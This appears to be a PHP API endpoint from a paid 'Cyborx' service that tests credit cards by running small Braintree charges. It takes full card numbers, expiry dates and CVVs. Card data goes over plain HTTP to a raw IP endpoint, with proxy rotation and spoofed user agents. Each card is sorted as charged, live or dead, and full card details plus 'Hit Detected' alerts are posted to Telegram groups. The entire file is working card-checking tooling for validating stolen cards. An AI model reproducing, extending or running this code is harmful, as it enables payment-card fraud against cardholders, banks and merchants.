<?php
declare(strict_types=1);
require_once __DIR__ . '/../../app/Bootstrap.php'; // Adjusted path
require_once __DIR__ . '/../../app/Db.php';
require_once __DIR__ . '/../../app/Telegram.php';
header('Content-Type: application/json; charset=utf-8');
use App\Db;
use App\Telegram;
if (empty($_SESSION['uid'])) {
    http_response_code(401);
    echo json_encode(['Response' => 'Session expired']);
    exit;
}
$pdo = Db::pdo();
$uid = (int)$_SESSION['uid'];
$username = $_SESSION['uname'] ?? ('tg_' . $uid);
// Fetch user details
$stmt = $pdo->prepare("SELECT telegram_id, first_name, last_name, status, credits FROM users WHERE id = ? LIMIT 1");
$stmt->execute([$uid]);
$userData = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$userData) {
    echo json_encode(['Response' => 'User not found']);
    exit;
}
$telegramId = $userData['telegram_id'];
$userFirstName = $userData['first_name'] ?? $username;
$userLastName = $userData['last_name'] ?? '';
$userStatus = strtoupper($userData['status'] ?? 'FREE');
$userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
$currentCredits = (int)$userData['credits'];
if ($userStatus === 'BANNED') {
    echo json_encode(['Response' => 'You are banned from using Cyborx.']);
    exit;
}
if ($userStatus === 'FREE') {
    echo json_encode(['Response' => 'This API is only usable for Premium or Admin Users. Please upgrade your Plan.']);
    exit;
}
if ($currentCredits < 1) { // Adjusted to 1 credit for Braintree 0.3$ Charge
    echo json_encode(['Response' => 'Insufficient Credits']);
    exit;
}
// Proxy setup from separate GET parameters
$proxyHost = $_GET['host'] ?? '';
$proxyPort = (int)($_GET['port'] ?? 0);
$proxyUsername = $_GET['user'] ?? '';
$proxyPassword = $_GET['pass'] ?? '';
// Validate proxy fields
if (!empty($proxyHost) || !empty($proxyPort) || !empty($proxyUsername) || !empty($proxyPassword)) {
    if (empty($proxyHost) || $proxyPort <= 0) {
        echo json_encode(['Response' => 'Invalid Proxy Format: Host and Port are required']);
        exit;
    }
    $proxy = "$proxyHost:$proxyPort:$proxyUsername:$proxyPassword"; // Format for API
} else {
    $proxy = '';
}
// Define $proxyRequired based on GET parameter
$proxyRequired = isset($_GET['useProxy']) && $_GET['useProxy'] === '1';
// ---------- Validate input ----------
$cc1 = $_GET['cc'] ?? '';
$ccParts = explode('|', $cc1);
$cc = trim($ccParts[0] ?? '');
$month = trim($ccParts[1] ?? '');
$year = trim($ccParts[2] ?? '');
$cvv = trim($ccParts[3] ?? '');
if (empty($cc1) || !preg_match('/\d{15,16}[|:\/\s]\d{1,2}[|:\/\s]\d{2,4}[|:\/\s]\d{3,4}/', $cc1)) {
    echo json_encode(['Response' => 'Invalid Card Format']);
    exit;
}
// Normalize year
$yearLength = strlen($year);
if ($yearLength <= 2) {
    $year = "20" . $year;
}
// Map month to two digits
$month = sprintf('%02d', (int)$month);
// ---------- helpers ----------
function generateUserAgent() {
    $browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
    ];
    return $browsers[array_rand($browsers)];
}
function getBinInfo($binNumber, $ch) {
    $url = "https://bins.antipublic.cc/bins/{$binNumber}";
    $headers = [
        'Accept: application/json',
        'User-Agent: ' . generateUserAgent(),
    ];
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode !== 200) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $binData = json_decode($response, true) ?: [];
    return [
        'brand' => $binData['brand'] ?? 'UNKNOWN',
        'card_type' => $binData['type'] ?? 'UNKNOWN',
        'level' => $binData['level'] ?? 'STANDARD',
        'issuer' => $binData['bank'] ?? 'Unknown',
        'country_info' => ($binData['country_name'] ?? 'Unknown') . ' ' . ($binData['country_flag'] ?? '')
    ];
}
function updateCredits($pdo, $uid, $deduct, $isLive = false, $isCharged = false) {
    global $currentCredits;
    $newCredits = max(0, $currentCredits - $deduct);
    $lives = $isLive ? 1 : 0;
    $charges = $isCharged ? 1 : 0;
    $stmt = $pdo->prepare("UPDATE users SET credits = ?, lives = lives + ?, charges = charges + ? WHERE id = ?");
    $stmt->execute([$newCredits, $lives, $charges, $uid]);
    return $newCredits;
}
function sendTelegramMessage($botToken, $chatId, $messageHtml) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $messageHtml,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($postData),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}
// Fetch bot token from .env
$botToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? '';
if (empty($botToken)) {
    echo json_encode(['Response' => 'Bot token missing in config']);
    exit;
}
// ---------- BIN info (use its own curl handle) ----------
$chBin = curl_init();
curl_setopt($chBin, CURLOPT_RETURNTRANSFER, true);
curl_setopt($chBin, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($chBin, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($chBin, CURLOPT_SSL_VERIFYHOST, false);
$bin = substr($cc, 0, 6);
$binInfo = getBinInfo($bin, $chBin);
curl_close($chBin);
// ---------- Request to MOCK endpoint (separate handle) ----------
$requestUrl = "http://206.206.78.217:1520/?cc={$cc}|{$month}|{$year}|{$cvv}";
if ($proxyRequired) { // Use proxy only if useProxy=1 is set
    $requestUrl .= "&proxy={$proxy}";
}
$req = curl_init();
curl_setopt_array($req, [
    CURLOPT_URL => $requestUrl,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HEADER => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_HTTPGET => true,
    CURLOPT_CONNECTTIMEOUT => 40,
    CURLOPT_TIMEOUT => 100,
    CURLOPT_ENCODING => '', // accept gzip if any
    CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
    CURLOPT_USERAGENT => generateUserAgent(),
    CURLOPT_HTTPHEADER => [
        'Accept: application/json',
        'Cache-Control: no-cache',
        'Pragma: no-cache',
    ],
]);
$response = curl_exec($req);
// Check for curl execution failure

curl_close($req);
// $file = "b3charge_cc_responses.txt";
// $handle = fopen($file, "a");
// $content = "cc = $cc1\nresponse = $response\n\n";
// fwrite($handle, $content);
// fclose($handle);
// ---------- Process response ----------
$responseData = json_decode($response, true);
// Ensure $responseData is valid, default to empty array if decoding fails
if ($responseData === null) {
    $responseData = [];
}
$dead_responses = [
    "Closed Card" => "Closed Card",
    "Do Not Honor" => "Do Not Honor",
    "Declined - Call Issuer" => "Declined - Call Issuer",
    "Your payment method was rejected due to 3D Secure" => "Rejected - 3D Secure",
    "Processor Declined" => "Processor Declined",
    "Pick Up Card" => "Pickup Card",
    "Gateway Rejected: fraud" => "Gateway Rejected: Fraud",
    "No Account" => "No Account",
    "You have reached the max payment attempt for this order" => "Max Attempt Reached",
    "Cannot Authorize at this time" => "Cannot Authorize at this time",
    "Processor Declined - Fraud Suspected" => "Processor Declined - Fraud Suspected",
    "Card Not Activated" => "Card Not Activated",
    "Card Account Length Error" => "Card Account Length Error",
    "Invalid Authorization Code" => "Invalid Authorization Code",
    "restriction on the card" => "Restricted Card",
    "Transaction amount exceeds" => "Transactions Limit Exceeds",
    "Processor Declined - Possible Stolen Card" => "Processor Declined - Possible Stolen Card",
    "Processor Decline - Please try another card" => "Processor Decline - Please try another card",
    "Error - Do Not Retry, Call Issuer" => "Do Not Retry",
    "Invalid Client ID" => "Invalid Client ID",
    "Declined - Call For Approval" => "Call For Approval",
    "Expired Card" => "Expired Card",
    "Limit Exceeded" => "Limit Exceeded",
    "Cardholder's Activity Limit Exceeded" => "Limit Exceeded",
    "Invalid Credit Card Number" => "Invalid Credit Card Number",
    "Invalid Expiration Date" => "Invalid Expiration Date",
    "No Such Issuer" => "No Such Issuer",
    "Duplicate Transaction" => "Duplicate Transaction",
    "Transaction Not Allowed" => "Transaction Not Allowed",
    "Processor Declined Possible Lost Card" => "Lost Card",
    "Invalid Transaction" => "Invalid Transaction",
    "Please wait for 20 seconds." => "Please wait for 20 seconds.",
    "Card Type Not Enabled" => "Invalid Transaction",
    "Voice Authorization Required" => "Voice Authorization Required",
    "Cardholder Stopped Billing" => "Cardholder Stopped Billing",
    "Cardholder Stopped All Billing" => "Cardholder Stopped All Billing",
    "risk_threshold" => "RISK: Retry this BIN later.",
    "Sorry, we do not have enough" => "Out of Stock",
    "We were unable to process your order" => "We were unable to process your order",
    "Submit form failed" => "Submit form failed",
    "We cannot process your oder" => "We cannot process your order",
    "ProxyError" => "Proxy Connection Refused"
];
$liveResponses = ['Live ✅', 'Insufficient Funds', 'Card Issuer Declined CVV'];
// Check for Approved response first
if (
    (stripos($response, 'Payment successful') !== false)) {
    $err = 'Your payment successful';
    $new_credits = updateCredits($pdo, $uid, 5, true, false); // 1 credit for Approved
    $fullResult =
        "<b>#BraintreeCharge</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Charge 🔥\n" .
        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
        "[ﾒ] <b>Gateway ➜</b> Braintree 0.3$ Charge\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    $publicMessage =
        "<b>Hit Detected ✅</b>\n" .
        "━━━━━━━━\n" .
        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "<b>Status ➜</b> <b>Charge 🔥</b>\n" .
        "<b>Response ➜</b> {$err} 🎉\n" .
        "<b>Gateway ➜</b> Braintree 0.3$ Charge\n" .
        "━━━━━━━━\n" .
        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
    echo json_encode([
        'status' => 'approved',
        'Response' => $err,
        'Gateway' => 'Braintree 0.3$ Charge',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    exit;
} elseif (stripos($response, 'Insufficient Funds') !== false) {
    $err = 'Insufficient Funds';
    $new_credits = updateCredits($pdo, $uid, 3, true, false); // 1 credit for Live
    $fullResult =
        "<b>#BraintreeCharge</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> Braintree 0.3$ Charge\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    
    // $publicMessage =
    //     "<b>Hit Detected ✅</b>\n" .
    //     "━━━━━━━━\n" .
    //     "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
    //     "<b>Status ➜</b> <b>Live ✅</b>\n" .
    //     "<b>Response ➜</b> {$err} \n" .
    //     "<b>Gateway ➜</b> Braintree 0.3$ Charge\n" .
    //     "━━━━━━━━\n" .
    //     "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    // sendTelegramMessage($botToken, '-1002552641928', $publicMessage);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'Braintree 0.3$ Charge',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    exit;
} elseif (stripos($response, 'Card Issuer Declined CVV') !== false) {
    $err = 'Card Issuer Declined CVV';
    $new_credits = updateCredits($pdo, $uid, 3, true, false); // 1 credit for Live
    $fullResult =
        "<b>#BraintreeCharge</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> Braintree 0.3$ Charge\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    
    // $publicMessage =
    //     "<b>Hit Detected ✅</b>\n" .
    //     "━━━━━━━━\n" .
    //     "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
    //     "<b>Status ➜</b> <b>Live ✅</b>\n" .
    //     "<b>Response ➜</b> {$err} \n" .
    //     "<b>Gateway ➜</b> Braintree 0.3$ Charge\n" .
    //     "━━━━━━━━\n" .
    //     "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    // sendTelegramMessage($botToken, '-1002552641928', $publicMessage);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'Braintree 0.3$ Charge',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    exit;
} else {
    // Check for dead responses
    $deadFound = false;
    foreach ($dead_responses as $deadKey => $deadValue) {
        if (stripos($response, $deadKey) !== false) {
            $err = $deadValue;
            $deadFound = true;
            break;
        }
    }
    if ($deadFound) {
        $new_credits = updateCredits($pdo, $uid, 0); // No credit deduction for dead
        echo json_encode([
            'status' => 'dead',
            'Response' => $err,
            'Gateway' => 'Braintree 0.3$ Charge',
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $binInfo['brand'],
            'card_type' => $binInfo['card_type'],
            'level' => $binInfo['level'],
            'issuer' => $binInfo['issuer'],
            'country_info' => $binInfo['country_info']
        ]);
        exit;
    } else {
        $err = $responseData['result'] ?? $response;
        $new_credits = updateCredits($pdo, $uid, 0); // No credit deduction for unknown
        echo json_encode([
            'status' => 'dead',
            'Response' => $err,
            'Gateway' => 'Braintree 0.3$ Charge',
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $binInfo['brand'],
            'card_type' => $binInfo['card_type'],
            'level' => $binInfo['level'],
            'issuer' => $binInfo['issuer'],
            'country_info' => $binInfo['country_info']
        ]);
        exit;
    }
}